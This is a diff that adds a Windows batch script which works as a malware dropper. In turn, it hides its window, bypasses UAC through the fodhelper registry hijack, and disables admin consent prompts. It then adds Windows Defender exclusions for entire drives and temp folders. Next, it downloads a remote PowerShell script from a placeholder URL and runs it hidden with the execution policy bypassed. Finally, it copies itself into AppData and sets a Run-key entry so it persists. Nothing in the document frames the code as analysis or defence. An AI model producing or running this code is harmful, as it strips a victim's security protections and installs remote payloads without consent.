@@ -1,0 +1,49 @@
+﻿#Hide CMD
+if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
+@echo off
+echo "EP, code started"
+#UAC Bypass
+REG ADD "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" /t REG_SZ /d "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" /f
+REG ADD "hkcu\software\classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d " " /f
+fodhelper.exe
+echo "UAC has been disabled"
+#Run As Admin
+if "%~s0"=="%~s1" ( cd %~sp1 & shift ) else (
+  echo CreateObject^("Shell.Application"^).ShellExecute "%~s0","%~0 %*","","runas",1 >"%tmp%%~n0.vbs" & "%tmp%%~n0.vbs" & del /q "%tmp%%~n0.vbs" & goto :eof
+)
+#استثناء
+PowerShell Add-MpPreference -ExclusionPath "C:\"
+Powershell -Command "Set-MpPreference -ExclusionExtension bat"
+powershell -Command Add-MpPreference -ExclusionExtension "C:\"
+powershell -Command Add-MpPreference -ExclusionExtension "C:\Windows"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'TEMP'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\sysconfig'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'D:\'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'E:\'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'F:\'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'J:\'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'G:\'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'I:\'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Windows"
+powershell -Command Add-MpPreference -ExclusionExtension "%TEMP%"
+powershell -Command Add-MpPreference -ExclusionExtension "TEMP"
+Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
+#===
+setlocal enabledelayedexpansion
+start /B PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('%%%Last URL%%%','%APPDATA%\Scan.ps1')
+@echo off
+ set "appDataPath=%APPDATA%"
+echo AppData path: !appDataPath!
+start /B powershell.exe -ExecutionPolicy Bypass -File "!appDataPath!\Scan.ps1" -noprofile -windowstyle hidden
+set "currentFileName=%~nx0"
+set "appDataFolder=%APPDATA%\Win32SecTool"
+set "destinationPath=!appDataFolder!"
+mkdir "!destinationPath!"
+copy "%~f0" "!destinationPath!" /Y
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Sys64" /t REG_SZ /d "\"!destinationPath!\!currentFileName!\"" /f
+
+endlocal
+exit
